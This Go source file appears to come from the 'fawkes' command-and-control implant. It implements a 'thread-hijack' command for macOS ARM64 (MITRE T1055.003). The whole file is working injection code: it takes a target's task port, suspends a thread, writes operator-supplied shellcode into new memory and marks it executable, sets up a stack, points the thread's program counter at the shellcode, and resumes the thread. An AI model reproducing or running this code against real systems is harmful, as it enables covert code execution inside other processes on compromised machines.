//go:build darwin && arm64

package commands

import (
	"encoding/base64"
	"fmt"
	"os"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

type ThreadHijackCommand struct{}

type ThreadHijackParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
	TID          int    `json:"tid"`
}

func (c *ThreadHijackCommand) Name() string { return "thread-hijack" }
func (c *ThreadHijackCommand) Description() string {
	return "Thread execution hijacking via Mach APIs — suspend thread, redirect PC to shellcode, resume (T1055.003)"
}

func (c *ThreadHijackCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[ThreadHijackParams](task)
	if parseErr != nil {
		return *parseErr
	}

	if params.ShellcodeB64 == "" {
		return errorResult("Error: shellcode_b64 is required")
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: shellcode is empty")
	}

	if params.PID <= 0 {
		return errorResult("Error: invalid PID specified (must be greater than 0)")
	}

	if os.Getuid() != 0 {
		return errorResult("Error: thread hijack on macOS requires root (task_for_pid needs com.apple.security.cs.debugger entitlement or root)")
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	output, err := performThreadHijackDarwin(shellcode, params.PID, params.TID)
	if err != nil {
		return errorResult(output + fmt.Sprintf("\n[!] Thread hijack failed: %v", err))
	}

	return successResult(output)
}

func performThreadHijackDarwin(shellcode []byte, pid, tid int) (string, error) {
	var sb strings.Builder
	sb.WriteString("[*] Thread Hijack Injection (macOS ARM64)\n")
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", pid))
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))

	// Step 1: Get task port for the target process.
	taskPort, err := machTaskForPid(pid)
	if err != nil {
		return sb.String(), err
	}
	defer machPortDeallocate(machTaskSelf(), taskPort)
	sb.WriteString(fmt.Sprintf("[+] Got task port: %d\n", taskPort))

	// Step 2: Get thread list.
	threads, err := machTaskThreads(taskPort)
	if err != nil {
		return sb.String(), fmt.Errorf("enumerating threads: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Found %d thread(s)\n", len(threads)))

	// Step 3: Select target thread.
	var targetThread uint32
	if tid > 0 {
		found := false
		for _, t := range threads {
			if int(t) == tid {
				targetThread = t
				found = true
				break
			}
		}
		if !found {
			return sb.String(), fmt.Errorf("thread %d not found in target process", tid)
		}
		sb.WriteString(fmt.Sprintf("[*] Using specified thread: %d\n", targetThread))
	} else {
		targetThread = threads[0]
		sb.WriteString(fmt.Sprintf("[+] Auto-selected thread: %d\n", targetThread))
	}

	// Step 4: Suspend the target thread.
	if err := machThreadSuspend(targetThread); err != nil {
		return sb.String(), fmt.Errorf("suspending thread: %w", err)
	}
	sb.WriteString("[+] Thread suspended\n")

	resumeOnError := func() {
		_ = machThreadResume(targetThread)
	}

	// Step 5: Allocate memory for shellcode (RW, then RX).
	allocSize := uint64(((len(shellcode) + darwinPageSize - 1) / darwinPageSize) * darwinPageSize)
	scAddr, err := machVmAllocate(taskPort, allocSize)
	if err != nil {
		resumeOnError()
		return sb.String(), err
	}
	sb.WriteString(fmt.Sprintf("[+] Allocated RW memory at 0x%X (%d bytes)\n", scAddr, allocSize))

	if err := machVmWrite(taskPort, scAddr, shellcode); err != nil {
		_ = machVmDeallocate(taskPort, scAddr, allocSize)
		resumeOnError()
		return sb.String(), fmt.Errorf("writing shellcode: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes to 0x%X\n", len(shellcode), scAddr))

	if err := machVmProtect(taskPort, scAddr, allocSize, false, vmProtRead|vmProtExecute); err != nil {
		_ = machVmDeallocate(taskPort, scAddr, allocSize)
		resumeOnError()
		return sb.String(), err
	}
	sb.WriteString("[+] Memory protection: RW -> RX\n")

	// Step 6: Allocate a stack for the shellcode.
	const stackSize = 64 * 1024 // 64KB stack
	stackBase, err := machVmAllocate(taskPort, stackSize)
	if err != nil {
		_ = machVmDeallocate(taskPort, scAddr, allocSize)
		resumeOnError()
		return sb.String(), fmt.Errorf("allocating stack: %w", err)
	}
	// Stack grows downward; SP points to top, 16-byte aligned.
	stackTop := stackBase + stackSize - 16
	sb.WriteString(fmt.Sprintf("[+] Allocated stack: 0x%X-0x%X (SP=0x%X)\n", stackBase, stackBase+stackSize, stackTop))

	// Step 7: Get current thread state.
	origState, err := machThreadGetState(targetThread)
	if err != nil {
		_ = machVmDeallocate(taskPort, scAddr, allocSize)
		_ = machVmDeallocate(taskPort, stackBase, stackSize)
		resumeOnError()
		return sb.String(), fmt.Errorf("getting thread state: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Original PC: 0x%X, SP: 0x%X, LR: 0x%X\n", origState.PC, origState.SP, origState.LR))

	// Step 8: Set new thread state — redirect PC to shellcode.
	newState := ARM64ThreadState{
		PC:   scAddr,
		SP:   stackTop,
		LR:   0, // no return — shellcode is terminal
		FP:   0,
		CPSR: origState.CPSR & 0xFFFFFFF0, // clear NZCV flags, keep EL0
	}

	if err := machThreadSetState(targetThread, &newState); err != nil {
		_ = machVmDeallocate(taskPort, scAddr, allocSize)
		_ = machVmDeallocate(taskPort, stackBase, stackSize)
		resumeOnError()
		return sb.String(), fmt.Errorf("setting thread state: %w", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Thread state modified: PC=0x%X, SP=0x%X\n", scAddr, stackTop))

	// Step 9: Resume thread — shellcode begins executing.
	if err := machThreadResume(targetThread); err != nil {
		return sb.String(), fmt.Errorf("resuming thread: %w", err)
	}
	sb.WriteString("[+] Thread resumed\n")

	sb.WriteString(fmt.Sprintf("[+] Thread hijack complete — PID %d thread %d executing shellcode at 0x%X\n",
		pid, targetThread, scAddr))

	return sb.String(), nil
}
